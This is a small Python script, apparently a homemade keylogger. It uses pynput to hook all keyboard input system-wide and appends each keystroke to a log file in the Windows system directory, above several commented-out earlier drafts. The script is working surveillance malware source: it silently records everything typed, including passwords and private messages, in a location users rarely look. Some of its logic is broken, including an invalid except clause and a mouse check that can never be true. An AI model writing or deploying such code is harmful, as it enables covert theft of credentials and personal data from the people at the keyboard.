from pynput import keyboard
from pynput.mouse import Button

# c = keyboard.Controller()
# l = keyboard.Listener(on_press=lambda p:print(repr(p.value)))
# l.start()

# def on_press(key):
#     try:
#         print(f'Pressed:{key.char}')
#     except key == keyboard.Key.esc:
#         print(f'Pressed:{key}')
#         # exit()

# with keyboard.Listener(on_press=on_press) as listener:
#     listener.join()

def on_press(key):
    letter = str(key)
    letter = letter.replace("'", '')
    mouse = Button

    if letter == "Key.space":
        letter = ' '
    elif letter == 'Key.esc':
        letter = ''
    elif letter == 'Key.enter':
        letter = '\n'
    elif letter == 'Key.shift' or letter == 'Key.shift_r':
        letter = ''
    elif mouse == mouse.left:
        letter = '\n'

    with open(r'c:\windows\log.txt', 'a') as f:
        f.write(letter)
    if key == keyboard.Key.esc:
        exit()

with keyboard.Listener(on_press = on_press) as listener:
    listener.join()
